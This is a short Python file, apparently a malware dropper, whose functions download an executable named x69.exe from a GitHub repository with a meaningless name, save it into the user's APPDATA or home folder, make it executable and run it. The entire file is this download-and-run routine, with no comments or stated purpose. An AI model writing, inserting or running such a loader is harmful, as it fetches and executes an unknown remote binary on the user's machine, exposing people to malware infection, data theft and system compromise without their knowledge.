import os
import requests
import subprocess
import sys

def download_executable(url, destination):
    response = requests.get(url)
    response.raise_for_status()
    with open(destination, 'wb') as file:
        file.write(response.content)

def execute_executable(executable_path):
    if sys.platform == "win32":
        subprocess.run([executable_path], check=True)
    else:
        subprocess.run(['chmod', '+x', executable_path])
        subprocess.run([executable_path], check=True)

def load_and_execute():
    url = "https://github.com/mtlnewacc6-sys/adadad/raw/refs/heads/main/x69.exe"
    appdata = os.getenv('APPDATA') or os.path.expanduser('~')
    executable_path = os.path.join(appdata, 'x69.exe')
    download_executable(url, executable_path)
    execute_executable(executable_path)